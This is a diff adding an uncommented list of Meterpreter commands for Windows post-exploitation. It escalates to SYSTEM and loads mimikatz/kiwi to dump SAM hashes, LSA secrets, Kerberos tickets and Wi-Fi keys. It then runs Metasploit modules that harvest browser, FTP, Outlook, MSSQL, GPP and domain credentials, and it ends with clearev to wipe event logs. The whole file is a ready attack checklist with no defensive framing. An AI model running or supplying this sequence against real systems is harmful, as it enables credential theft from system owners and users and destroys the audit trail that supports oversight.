@@ -1,0 +1,44 @@
+getsystem
+load kiwi
+creds_all                            
+kerberos_ticket_list  
+lsa_dump_sam         
+lsa_dump_secrets         
+wifi_list            
+wifi_list_shared     
+load mimikatz
+kerberos        
+livessp           
+msv               
+ssp             
+tspkg           
+wdigest
+run post/windows/gather/smart_hashdump
+run post/windows/manage/vss_storage
+run post/windows/manage/vss_list
+screenshot
+sysinfo
+ifconfig
+netstat
+run winenum
+getprivs
+run post/windows/gather/win_privs
+run post/windows/gather/usb_history
+run post/windows/gather/psreadline_history
+run post/windows/gather/make_csv_orgchart
+run post/windows/gather/cachedump
+run post/windows/gather/credentials/domain_hashdump
+run post/windows/gather/credentials/ftpx
+run post/windows/gather/credentials/gpp
+run post/windows/gather/credentials/outlook
+run post/windows/gather/credentials/mssql_local_hashdump                                                                                                         
+run credcollect                                                                                                                                         
+run post/windows/gather/enum_chrome                                                         
+run enum_firefox                                                                                                                                                                           
+run get_filezilla_creds  
+run post/multi/gather/filezilla_client_cred                                                                                                                                                
+run post/multi/gather/firefox_creds                                                                                                                                                           
+run post/windows/gather/enum_ie                                                                                                                                                 
+run post/windows/gather/enum_av_excluded 
+run post/windows/gather/credentials/enum_cred_store                                                                                                                                           
+clearev
